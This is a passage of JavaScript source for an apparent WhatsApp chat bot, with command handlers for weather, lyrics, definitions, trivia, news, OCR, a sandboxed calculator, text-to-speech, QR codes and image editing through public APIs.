              displayName: `${parseFloat(coordMatch[1]).toFixed(4)}, ${parseFloat(coordMatch[2]).toFixed(4)}`
            };
          } else {
            // Try Google Maps first (more accurate for street names) if key is set
            if (process.env.GOOGLE_MAPS_API_KEY) {
              console.log('[weather] Trying Google Maps geocoding');
              geo = await _ph_geocodeGoogle(location);
              if (geo) console.log(`[weather] ✅ Google Maps hit: ${geo.displayName}`);
            }
            // Fall back to Nominatim (OSM, free)
            if (!geo) {
              console.log('[weather] Trying Nominatim geocoding');
              geo = await _ph_geocodeNominatim(location);
              if (geo) console.log(`[weather] ✅ Nominatim hit: ${geo.displayName}`);
            }
          }

          if (!geo) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ LOCATION NOT FOUND',
                `┃  🔎 *QUERY*  : "${location}"\n\n` +
                `┃  💡 *TIP*     : Try one of:\n` +
                `┃    • City + State + Country\n` +
                `┃    • Street + City\n` +
                `┃    • Coordinates: lat,lng`)
            }, quotedOpts(msg));
            return;
          }

          // Step 2: Get weather data
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🌤️ FETCHING WEATHER',
              `┃  📍 *LOCATION*: ${geo.displayName}\n` +
              `┃  🌐 *COORDS*  : ${geo.lat.toFixed(4)}, ${geo.lng.toFixed(4)}\n` +
              `┃  ⏳ *STATUS*  : Getting live data...`)
          }, quotedOpts(msg));

          const w = await _ph_getWeather(geo.lat, geo.lng);
          if (!w) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ WEATHER UNAVAILABLE',
                `┃  📍 *LOCATION*: ${geo.displayName}\n\n` +
                `┃  💡 *TIP*     : Try again in a moment`)
            }, quotedOpts(msg));
            return;
          }

          const wmo = _ph_wmoCode(w.code);
          const uvCat = w.uv == null ? 'N/A'
                      : w.uv < 3   ? `${w.uv} (Low)`
                      : w.uv < 6   ? `${w.uv} (Moderate)`
                      : w.uv < 8   ? `${w.uv} (High)`
                      : w.uv < 11  ? `${w.uv} (Very High)`
                      : `${w.uv} (Extreme)`;

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, `${wmo.i} WEATHER REPORT`,
              `┃  📍 *LOCATION*: ${geo.displayName}\n` +
              `┃  🌐 *COORDS*  : ${geo.lat.toFixed(4)}, ${geo.lng.toFixed(4)}\n` +
              `┃  🕐 *TIME*    : ${w.timezone}\n\n` +
              `┃  🌡️ *TEMP*     : ${w.temp}°C  /  ${w.tempF}°F\n` +
              `┃  🤒 *FEELS*    : ${w.feelsLike}°C\n` +
              `┃  ${wmo.i} *CONDITION*: ${wmo.d}\n` +
              `┃  💧 *HUMIDITY* : ${w.humidity}%\n` +
              `┃  💨 *WIND*     : ${w.windSpeed} km/h ${_ph_windDir(w.windDirDeg)}\n` +
              `┃  ☀️ *UV INDEX*: ${uvCat}\n` +
              (w.precip > 0 ? `┃  🌧️ *PRECIP*   : ${w.precip} mm\n` : '') +
              `\n┃  🌅 *SUNRISE*  : ${w.sunrise}\n` +
              `┃  🌇 *SUNSET*   : ${w.sunset}\n\n` +
              `┃  ─── *NEXT 6 HOURS* ───\n` +
              `┃  ${w.rain.summary}\n` +
              (w.rain.next3hProb > 0 ? `┃  📊 *3H AVG*    : ${w.rain.next3hProb}% chance, ${w.rain.next3hMm} mm\n` : ''))
          }, quotedOpts(msg));
        } catch (e) {
          console.error('[weather] Error:', e);
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Weather failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .lyrics <song> [by artist] ── lyrics.ovh (free, no key)
      // Accepts: ".lyrics Unavailable", ".lyrics Unavailable - Davido",
      //          ".lyrics Unavailable by Davido", ".lyrics Unavailable | Davido"
      if (lower === '.lyrics' || lower.startsWith('.lyrics ')) {
        const query = lower === '.lyrics' ? '' : text.slice(8).trim();
        if (!query) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .lyrics <song> [by artist]\n\n` +
              `Examples:\n` +
              `  .lyrics Unavailable\n` +
              `  .lyrics Unavailable - Davido\n` +
              `  .lyrics Unavailable by Davido\n` +
              `  .lyrics Unavailable | Davido`
            )
          }, quotedOpts(msg));
          return;
        }

        const persona = _ph_currentPersona(sock);
        let artist = '', title = query;

        // Parse "title - artist" / "title by artist" / "title | artist"
        const dash = query.indexOf(' - ');
        const pipe = query.indexOf(' | ');
        const byIdx = query.toLowerCase().indexOf(' by ');
        if (dash > 0)      { artist = query.slice(dash + 3).trim(); title = query.slice(0, dash).trim(); }
        else if (pipe > 0) { artist = query.slice(pipe + 3).trim(); title = query.slice(0, pipe).trim(); }
        else if (byIdx > 0){ artist = query.slice(byIdx + 4).trim(); title = query.slice(0, byIdx).trim(); }

        try {
          let lyrics = '';
          let actualArtist = artist;
          let actualTitle = title;

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔍 SEARCHING LYRICS',
              `┃  🎵 *QUERY*  : "${query}"\n┃  ⏳ *STATUS* : Searching lyrics sites...`)
          }, quotedOpts(msg));

          // Primary: LRCLIB — free, no key, usually more reliable than lyrics.ovh.
          const lrcHit = await _ph_searchLrcLibLyrics(query, artist, title);
          if (lrcHit) {
            lyrics = lrcHit.lyrics;
            actualArtist = lrcHit.artist;
            actualTitle = lrcHit.title;
          }

          // Fallback: old lyrics.ovh direct + suggest flow.
          if (!lyrics && artist) lyrics = await _ph_getLyrics(artist, title);

          if (!lyrics) {
            const results = await _ph_searchLyrics(query);
            if (results.length) {
              const top = results[0];
              actualArtist = top.artist?.name || 'Unknown';
              actualTitle = top.title || query;
              lyrics = await _ph_getLyrics(actualArtist, actualTitle);
            }
          }

          if (!lyrics || lyrics.length < 20) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ LYRICS UNAVAILABLE',
                `┃  🎵 *SONG*   : ${actualTitle || title}\n` +
                `┃  👤 *ARTIST* : ${actualArtist || 'Unknown'}\n\n` +
                `┃  💡 *TIP*     : Try adding artist name:\n` +
                `┃    .lyrics <title> - <artist>`)
            }, quotedOpts(msg));
            return;
          }

          const header = _ph_personaHeader(persona, '🎵 LYRICS',
            `┃  📛 *TITLE*  : ${actualTitle}\n` +
            `┃  👤 *ARTIST* : ${actualArtist}\n` +
            `┃  📏 *LINES*  : ${lyrics.split('\n').length}\n\n`
          );
          const lyricChunks = _ph_chunkText(lyrics, 3500);

          await sock.sendMessage(jid, { text: header + lyricChunks[0] }, quotedOpts(msg));
          for (let i = 1; i < lyricChunks.length; i++) {
            await sock.sendMessage(jid, { text: lyricChunks[i] }, quotedOpts(msg));
          }
        } catch (e) {
          console.error('[lyrics] Error:', e);
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Lyrics failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .define <word> ── dictionaryapi.dev (free, no key)
      if (lower === '.define' || lower.startsWith('.define ')) {
        const word = lower === '.define' ? '' : text.slice(8).trim();
        if (!word) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`Usage: .define <word>\nExample: .define ephemeral`)
          }, quotedOpts(msg));
          return;
        }
        const persona = _ph_currentPersona(sock);
        try {
          const result = await _ph_define(word);
          if (!result || !Array.isArray(result) || !result.length) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ WORD NOT FOUND',
                `┃  📖 *WORD*   : "${word}"\n┃  📭 No definition found in dictionary`)
            }, quotedOpts(msg));
            return;
          }
          const entry = result[0];
          const phonetic = entry.phonetic || entry.phonetics?.[0]?.text || '';
          const meanings = (entry.meanings || []).slice(0, 3);

          let body = `┃  📖 *WORD*    : ${entry.word}\n`;
          if (phonetic) body += `┃  🔊 *PHONETIC*: ${phonetic}\n`;
          body += '\n';
          meanings.forEach((m, i) => {
            body += `┃  *${i+1}. ${(m.partOfSpeech || '').toUpperCase()}*\n`;
            (m.definitions || []).slice(0, 2).forEach((d, j) => {
              body += `┃     ${j+1}. ${d.definition}\n`;
              if (d.example) body += `┃        _e.g. ${d.example}_\n`;
            });
            if (m.synonyms?.length) body += `┃     Synonyms: ${m.synonyms.slice(0, 5).join(', ')}\n`;
            body += '\n';
          });

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '📖 DICTIONARY', body)
          }, quotedOpts(msg));
        } catch (e) {
          console.error('[define] Error:', e);
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Define failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .trivia [category] [difficulty] ── Open Trivia DB (free, no key)
      // Examples: .trivia  /  .trivia science  /  .trivia sports hard
      if (lower === '.trivia' || lower.startsWith('.trivia ')) {
        const parts = text.trim().split(/\s+/).slice(1);
        const category = parts[0] || '';
        const difficulty = ['easy','medium','hard'].includes((parts[1] || 'easy').toLowerCase())
          ? parts[1].toLowerCase() : 'easy';

        const persona = _ph_currentPersona(sock);
        try {
          const q = await _ph_triviaQuestion(category, difficulty);
          if (!q) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ TRIVIA UNAVAILABLE',
                `┃  ⚠️ Couldn't fetch a question right now\n┃  💡 Try: .trivia`)
            }, quotedOpts(msg));
            return;
          }
          // Shuffle so correct isn't always A
          const allAnswers = [q.correct, ...q.incorrect];
          for (let i = allAnswers.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [allAnswers[i], allAnswers[j]] = [allAnswers[j], allAnswers[i]];
          }
          const letters = ['A','B','C','D'];

          let body = `┃  📚 *CATEGORY* : ${q.category}\n` +
                     `┃  ⚡ *DIFFICULTY*: ${q.difficulty.toUpperCase()}\n\n` +
                     `┃  ❓ *QUESTION* :\n┃  ${q.question}\n\n`;
          allAnswers.forEach((a, i) => { body += `┃  ${letters[i]}. ${a}\n`; });
          body += `\n┃  ⏳ *ANSWER REVEALS IN 20s*`;

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🎯 TRIVIA', body)
          }, quotedOpts(msg));

          // Reveal after 20s
          setTimeout(async () => {
            try {
              await sock.sendMessage(jid, {
                text: _ph_personaHeader(persona, '✅ ANSWER',
                  `┃  ✓ *CORRECT*  : ${q.correct}\n\n` +
                  `┃  🎯 Next: .trivia`)
              }, quotedOpts(msg));
            } catch (_) {}
          }, 20000);
        } catch (e) {
          console.error('[trivia] Error:', e);
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Trivia failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .shorten <url> ── is.gd (free, no key)
      if (lower === '.shorten' || lower.startsWith('.shorten ')) {
        const url = lower === '.shorten' ? '' : text.slice(9).trim();
        if (!url) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .shorten <url>\n` +
              `Example: .shorten https://example.com/very/long/path?with=params`)
          }, quotedOpts(msg));
          return;
        }
        if (!/^https?:\/\//i.test(url)) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Invalid URL — must start with http:// or https://`)
          }, quotedOpts(msg));
          return;
        }
        const persona = _ph_currentPersona(sock);
        try {
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔗 SHORTENING',
              `┃  🔗 *URL*     : ${url.slice(0, 50)}${url.length > 50 ? '...' : ''}\n` +
              `┃  ⏳ *STATUS* : Working...`)
          }, quotedOpts(msg));

          const shortUrl = await _ph_shortenUrl(url);
          if (!shortUrl) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ SHORTEN FAILED',
                `┃  ⚠️ Couldn't shorten URL\n┃  💡 Make sure it's a valid public URL`)
            }, quotedOpts(msg));
            return;
          }
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔗 SHORT URL',
              `┃  📥 *ORIGINAL*: ${url}\n` +
              `┃  📤 *SHORT*   : ${shortUrl}\n` +
              `┃  💾 *SAVED*   : ${url.length - shortUrl.length} chars`)
          }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Shorten failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .movie <title> ── Wikipedia REST API (free, no key)
      // Optional: set TMDB_API_KEY env var for richer results (poster, cast, etc.)
      if (lower === '.movie' || lower.startsWith('.movie ')) {
        const title = lower === '.movie' ? '' : text.slice(7).trim();
        if (!title) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .movie <title>\n` +
              `Examples:\n` +
              `  .movie Inception\n` +
              `  .movie The Matrix\n` +
              `  .movie Avengers Endgame`)
          }, quotedOpts(msg));
          return;
        }
        const persona = _ph_currentPersona(sock);
        try {
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🎬 FETCHING',
              `┃  🎬 *QUERY*  : "${title}"\n┃  ⏳ *STATUS* : Looking up...`)
          }, quotedOpts(msg));

          const movie = await _ph_movieWiki(title);
          if (!movie) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ NOT FOUND',
                `┃  🎬 *QUERY*  : "${title}"\n┃  📭 No info found`)
            }, quotedOpts(msg));
            return;
          }
          const extract = movie.extract.length > 800
            ? movie.extract.slice(0, 800) + '...'
            : movie.extract;

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🎬 MOVIE INFO',
              `┃  🎬 *TITLE*  : ${movie.title}\n` +
              (movie.description ? `┃  🏷️ *TYPE*   : ${movie.description}\n` : '') +
              `\n┃  📖 *PLOT*   :\n┃  ${extract}\n` +
              (movie.url ? `\n┃  🔗 *WIKI*   : ${movie.url}` : '')),
            contextInfo: movie.thumbnail ? {
              externalAdReply: {
                title: movie.title,
                body: extract.slice(0, 60),
                thumbnailUrl: movie.thumbnail,
                sourceUrl: movie.url || undefined,
                mediaType: 1
              }
            } : undefined
          }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Movie failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .news <topic> ── Google News RSS (free) + NewsAPI (if NEWS_API_KEY set)
      if (lower === '.news' || lower.startsWith('.news ')) {
        const topic = lower === '.news' ? '' : text.slice(6).trim();
        if (!topic) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .news <topic>\n\n` +
              `Examples:\n` +
              `  .news nigeria\n` +
              `  .news football\n` +
              `  .news wrestling\n` +
              `  .news technology\n` +
              `  .news bitcoin`)
          }, quotedOpts(msg));
          return;
        }
        const persona = _ph_currentPersona(sock);
        try {
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '📰 FETCHING NEWS',
              `┃  🔎 *TOPIC*  : "${topic}"\n┃  ⏳ *STATUS* : Searching...`)
          }, quotedOpts(msg));

          let articles = [];
          if (process.env.NEWS_API_KEY) {
            articles = await _ph_newsApi(topic);
            if (articles.length) console.log(`[news] ✅ NewsAPI: ${articles.length} articles`);
          }
          if (!articles.length) {
            articles = await _ph_newsGoogle(topic);
            if (articles.length) console.log(`[news] ✅ Google RSS: ${articles.length} articles`);
          }

          if (!articles.length) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '❌ NO NEWS FOUND',
                `┃  🔎 *TOPIC*  : "${topic}"\n┃  📭 Nothing matched`)
            }, quotedOpts(msg));
            return;
          }

          let body = `┃  🔎 *TOPIC*  : "${topic}"\n` +
                     `┃  📊 *SOURCE* : ${process.env.NEWS_API_KEY ? 'NewsAPI' : 'Google News'}\n\n`;
          articles.slice(0, 5).forEach((a, i) => {
            body += `┃  *${i+1}.* ${a.title}\n`;
            body += `┃     📰 ${a.source || 'Unknown'}\n`;
            if (a.pubDate) {
              const d = new Date(a.pubDate);
              if (!isNaN(d)) body += `┃     📅 ${d.toLocaleDateString()} ${d.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit'})}\n`;
            }
            if (a.link) body += `┃     🔗 ${a.link.slice(0, 60)}${a.link.length > 60 ? '...' : ''}\n`;
            body += '\n';
          });

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '📰 NEWS', body)
          }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ News failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .ocr ── Reply to an image with .ocr to extract text
      // Uses local tesseract.js (no API key, no external API call after init)
      if (lower === '.ocr' || lower.startsWith('.ocr ')) {
        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imageMsg = quotedMsg?.imageMessage;

        if (!imageMsg) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: Reply to an image with .ocr\n\n` +
              `The bot will extract text from the image\n` +
              `and send it back as plain text.\n\n` +
              `Supports: PNG, JPG, WEBP, screenshots\n` +
              `Best with: clear, high-contrast text`)
          }, quotedOpts(msg));
          return;
        }
        const persona = _ph_currentPersona(sock);
        try {
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔍 OCR IN PROGRESS',
              `┃  🖼️ *IMAGE*   : Detected\n┃  ⏳ *STATUS*  : Extracting text (first run may take 15s)...`)
          }, quotedOpts(msg));

          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          const buffer = Buffer.concat(chunks);
          console.log(`[ocr] Image size: ${(buffer.length / 1024).toFixed(1)}KB`);

          const text = await _ph_ocrImage(buffer);
          const trimmed = (text || '').trim();

          if (!trimmed) {
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '📭 NO TEXT FOUND',
                `┃  🖼️ *IMAGE*   : ${(buffer.length / 1024).toFixed(1)}KB\n` +
                `┃  📝 *RESULT* : No readable text detected\n\n` +
                `┃  💡 *TIP*     : Try a clearer image with\n┃                   higher contrast text`)
            }, quotedOpts(msg));
            return;
          }

          const header = _ph_personaHeader(persona, '📝 OCR RESULT',
            `┃  📄 *EXTRACTED* (${trimmed.length} chars, ${trimmed.split('\n').length} lines):\n\n`
          );
          const textChunks = _ph_chunkText(trimmed, 3500);
          await sock.sendMessage(jid, { text: header + textChunks[0] }, quotedOpts(msg));
          for (let i = 1; i < textChunks.length; i++) {
            await sock.sendMessage(jid, { text: textChunks[i] }, quotedOpts(msg));
          }
        } catch (e) {
          console.error('[ocr] Error:', e);
          const isMissing = /Cannot find module|tesseract/i.test(e.message);
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '❌ OCR FAILED',
              `┃  ⚠️ *ERROR*   : ${e.message}\n\n` +
              (isMissing
                ? `┃  💡 *TIP*     : tesseract.js isn't installed.\n┃                   Run: npm install tesseract.js`
                : `┃  💡 *TIP*     : Try a smaller or clearer image`))
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .calc <expression> ──
      if (lower.startsWith('.calc ')) {
        const expr = text.slice('.calc '.length).trim();
        if (!expr) { await sock.sendMessage(jid, { text: 'Usage: .calc <expression>\nExample: .calc 2+2*3' }, quotedOpts(msg)); return; }
        try {
          // Safe eval — only allow math characters
          const sanitized = expr.replace(/[^0-9+\-*/().%^ sqrtpiePI]/g, '')
            .replace(/sqrt/g, 'Math.sqrt')
            .replace(/pi/gi, 'Math.PI')
            .replace(/\^/g, '**');
          if (!sanitized || sanitized.length > 100) throw new Error('Invalid expression');
          const result = Function('"use strict"; return (' + sanitized + ')')();
          await sock.sendMessage(jid, { text: `🧮 *Calculator*\n\n${expr} = *${result}*` }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Invalid expression: ${expr}` }, quotedOpts(msg)); }
        return;
      }

      // ── .genpwd ──
      if (lower === '.genpwd') {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&*_+-=';
        const crypto = require('crypto');
        let pwd = '';
        for (let i = 0; i < 16; i++) pwd += chars[crypto.randomInt(chars.length)];
        await sock.sendMessage(jid, { text: `🔐 *Generated Password*\n\n\`${pwd}\`\n\n_16 chars · mixed case · numbers · symbols_` }, quotedOpts(msg));
        return;
      }

      // ── .base64 <text> ──
      if (lower.startsWith('.base64 ')) {
        const input = text.slice('.base64 '.length).trim();
        if (!input) { await sock.sendMessage(jid, { text: 'Usage: .base64 <text to encode>\nOr: .base64 <base64 string to decode>' }, quotedOpts(msg)); return; }
        // Try to detect if it's base64 to decode
        const b64regex = /^[A-Za-z0-9+/=]+$/;
        if (b64regex.test(input) && input.length > 4) {
          try {
            const decoded = Buffer.from(input, 'base64').toString('utf8');
            await sock.sendMessage(jid, { text: `🔓 *Decoded*\n\n${decoded}` }, quotedOpts(msg));
          } catch (_) {
            const encoded = Buffer.from(input).toString('base64');
            await sock.sendMessage(jid, { text: `🔒 *Encoded*\n\n${encoded}` }, quotedOpts(msg));
          }
        } else {
          const encoded = Buffer.from(input).toString('base64');
          await sock.sendMessage(jid, { text: `🔒 *Encoded*\n\n${encoded}` }, quotedOpts(msg));
        }
        return;
      }

      // ── .removebg (reply to image) ──
      if (lower === '.removebg') {
        const quotedImgMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || msg.message?.imageMessage;
        if (!quotedImgMsg) { await sock.sendMessage(jid, { text: '🖼️ Reply to an image with .removebg' }, quotedOpts(msg)); return; }
        try {
          await sock.sendMessage(jid, { text: '⏳ Removing background...' }, quotedOpts(msg));
          const stream = await downloadContentFromMessage(quotedImgMsg, 'image');
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          // Use remove.bg API (free tier: 50 images/month)
          const REMOVEBG_KEY = process.env.REMOVEBG_KEY;
          if (!REMOVEBG_KEY) {
            await sock.sendMessage(jid, { text: '⚠️ REMOVEBG_KEY is not set in the environment.' }, quotedOpts(msg));
            return;
          }
          const https = require('https');
          const FormData = require('form-data');
          // Simple multipart upload
          const boundary = '----FormBoundary' + Date.now();
          const body = Buffer.concat([
            Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="image_file"; filename="image.png"\r\nContent-Type: image/png\r\n\r\n`),
            buffer,
            Buffer.from(`\r\n--${boundary}\r\nContent-Disposition: form-data; name="size"\r\n\r\nauto\r\n--${boundary}--\r\n`)
          ]);
          const resultBuf = await new Promise((resolve, reject) => {
            const req = https.request({
              hostname: 'api.remove.bg', path: '/v1.0/removebg', method: 'POST',
              headers: { 'X-Api-Key': REMOVEBG_KEY, 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length }
            }, (res) => { const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve(Buffer.concat(c))); });
            req.on('error', reject); req.write(body); req.end();
          });
          await sock.sendMessage(jid, { image: resultBuf, caption: '✅ Background removed' }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .sticker (image → sticker) ──
      if (lower === '.sticker' || lower === '.s') {
        const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imgMsg = quotedRaw?.imageMessage || msg.message?.imageMessage;
        const vidMsg = quotedRaw?.videoMessage || msg.message?.videoMessage;
        if (!imgMsg && !vidMsg) {
          await sock.sendMessage(jid, { text: '🖼️ Reply to an *image* or short *video* with *.sticker* to convert it.' }, quotedOpts(msg));
          return;
        }
        try {
          const mediaType = imgMsg ? 'image' : 'video';
          const mediaData = imgMsg || vidMsg;
          const stream = await downloadContentFromMessage(mediaData, mediaType);
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          if (imgMsg) {
            await sock.sendMessage(jid, { sticker: buffer }, { quoted: msg });
          } else {
            // Video stickers need ffmpeg or webp conversion — send as-is for now
            await sock.sendMessage(jid, { sticker: buffer }, { quoted: msg });
          }
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Sticker failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .toimg (sticker → image) ──
      if (lower === '.toimg') {
        const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const stickerMsg = quotedRaw?.stickerMessage || msg.message?.stickerMessage;
        if (!stickerMsg) {
          await sock.sendMessage(jid, { text: '🖼️ Reply to a *sticker* with *.toimg* to convert it.' }, quotedOpts(msg));
          return;
        }
        try {
          const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          // Convert webp to png using sharp
          const sharp = require('sharp');
          const pngBuf = await sharp(buffer).png().toBuffer();
          await sock.sendMessage(jid, { image: pngBuf, caption: '🖼️ Sticker converted to image' }, { quoted: msg });
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Conversion failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .tts / .voice / .tovn <text> ──
      if (lower.startsWith('.tts ') || lower.startsWith('.voice ') || lower.startsWith('.tovn ') || lower === '.tts' || lower === '.voice' || lower === '.tovn') {
        const cmdName = lower.split(/\s+/)[0];
        const args = text.slice(cmdName.length).trim();
        let lang = 'en';
        let ttsText = args;
        // Check if first word is a language code (2-3 letters)
        const firstWord = args.split(/\s+/)[0];
        if (/^[a-z]{2,3}$/i.test(firstWord) && args.split(/\s+/).length > 1) {
          lang = firstWord.toLowerCase();
          ttsText = args.slice(firstWord.length).trim();
        }
        // If no text, try to get from quoted message
        if (!ttsText) {
          const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          ttsText = quotedRaw?.conversation || quotedRaw?.extendedTextMessage?.text || '';
        }
        if (!ttsText) {
          await sock.sendMessage(jid, { text: '🔊 *Text-to-Speech*\n\n*.tts <text>* — English\n*.tts yo Bawo ni* — Yoruba\n*.tovn <text>* — sends as voice note\n\n_Reply to a message with .tovn to convert._\n\nCodes: en, yo, ig, ha, fr, es, ar, sw, de, pt, zh, ja, ko' }, quotedOpts(msg));
          return;
        }
        try {
          // Use Google TTS endpoint
          const https = require('https');
          const encoded = encodeURIComponent(ttsText.slice(0, 200));
          const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encoded}&tl=${lang}&client=tw-ob`;
          const audioBuf = await new Promise((resolve, reject) => {
            const get = (u) => https.get(u, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
              if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) return get(res.headers.location);
              if (res.statusCode >= 400) return reject(new Error(`TTS HTTP ${res.statusCode}`));
              const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve(Buffer.concat(c)));
            }).on('error', reject);
            get(ttsUrl);
          });
          const isPtt = cmdName === '.tovn';
          await sock.sendMessage(jid, { audio: audioBuf, mimetype: 'audio/mpeg', ptt: isPtt }, { quoted: msg });
        } catch (e) { await sock.sendMessage(jid, { text: `❌ TTS failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .qr <text> ──
      if (lower.startsWith('.qr ')) {
        const qrText = text.slice('.qr '.length).trim();
        if (!qrText) { await sock.sendMessage(jid, { text: 'Usage: .qr <text or link>' }, quotedOpts(msg)); return; }
        try {
          const https = require('https');
          const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(qrText)}`;
          const qrBuf = await new Promise((resolve, reject) => {
            https.get(qrUrl, (res) => { const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve(Buffer.concat(c))); }).on('error', reject);
          });
          await sock.sendMessage(jid, { image: qrBuf, caption: `📱 *QR Code for:*\n_${qrText}_` }, { quoted: msg });
        } catch (e) { await sock.sendMessage(jid, { text: `❌ QR failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── IMAGE EDITING: .blur .invert .grayscale .brighten .darken .sharpen .pixelate ──
      if (/^\.(blur|invert|grayscale|brighten|darken|sharpen|pixelate)(\s|$)/i.test(lower)) {
        const op = lower.split(/\s+/)[0].slice(1);
        const amount = parseFloat(text.split(/\s+/)[1]) || 0;
        const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imgMsg = quotedRaw?.imageMessage || msg.message?.imageMessage;
        if (!imgMsg) {
          await sock.sendMessage(jid, { text: `🖼️ Reply to an image with *.${op}*${op === 'blur' || op === 'brighten' || op === 'darken' || op === 'pixelate' ? '\nOptional: .' + op + ' <amount>' : ''}` }, quotedOpts(msg));
          return;
        }
        try {
          const stream = await downloadContentFromMessage(imgMsg, 'image');
          let buffer = Buffer.from([]); for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
          const sharp = require('sharp');
          let img = sharp(buffer);
          switch (op) {
            case 'blur': img = img.blur(amount || 8); break;
            case 'invert': img = img.negate({ alpha: false }); break;
            case 'grayscale': img = img.grayscale(); break;
            case 'brighten': img = img.modulate({ brightness: amount || 1.4 }); break;
            case 'darken': img = img.modulate({ brightness: amount || 0.6 }); break;
            case 'sharpen': img = img.sharpen({ sigma: amount || 2 }); break;
            case 'pixelate': {
              const meta = await sharp(buffer).metadata();
              const w = meta.width || 512;
              const pixelSize = Math.max(2, Math.round(w / (amount || 20)));
              img = sharp(buffer).resize(pixelSize, null, { fit: 'inside' }).resize(w, null, { kernel: 'nearest' });
              break;
            }
          }
          const outBuf = await img.toBuffer();
          await sock.sendMessage(jid, { image: outBuf, caption: `✨ *${op}* applied` }, { quoted: msg });
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${op} failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }


      // ═══════════════════════════════════════════════════════
      // ══ FUN MENU COMMANDS ══════════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .joke ──
